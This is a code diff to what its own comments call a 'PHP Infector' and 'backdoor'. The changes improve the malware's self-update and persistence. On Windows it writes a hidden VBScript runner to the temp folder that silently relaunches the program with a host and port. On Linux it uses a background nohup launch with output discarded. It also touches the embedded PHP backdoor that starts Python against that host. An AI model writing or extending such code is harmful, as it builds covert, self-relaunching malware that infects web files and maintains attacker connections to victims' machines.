@@ -105,11 +105,17 @@ def selfUpdate():
         filename = "%d.py" % random.randint(1, 1000)
         if (not os.path.exists(filename)): break
 
-    f = open(filename, "w")
-    f.write(temporary)
-    f.close()
+    with open(filename, "w") as f:
+        f.write(temporary)
 
-    os.system("nohup python3 %s > /dev/null 2>&1 &" % (filename))
+    if sys.platform == "win32":
+        runner = '''Dim WinScriptHost
+Set WinScriptHost = CreateObject("WScript.Shell")
+WinScriptHost.Run Chr(34) & "%s" & Chr(34), 0
+Set WinScriptHost = Nothing''' %("{exe} {arg} {host} {port}".format(host=host, port=port, exe=sys.executable, arg=sys.argv[0]))
+        with open("%tmp%/runner.vbs", "w") as f: f.write(runner)
+        os.system("%tmp%/runner.vbs")
+    else: os.system("nohup {exe} {arg} {host} {port} > /dev/null 2>&1 &".format(host=host, port=port, exe=sys.executable, arg=sys.argv[0]))
 
 # PHP Infector
 backdoor = """
@@ -380,7 +386,7 @@ if (strpos($checker, "python") === False)
     evalRel("nohup python %s %s %s > /dev/null 2>&1 &", 2);
 }
 ?>
-""" % (host, port, os.path.realpath(__file__), host, port)
+""" % (host, port, os.path.realpath(__file__), host, port) #TODO: Fix Windows support.
 
 def find_files(directory, pattern):
     for root, dirs, files in os.walk(directory):
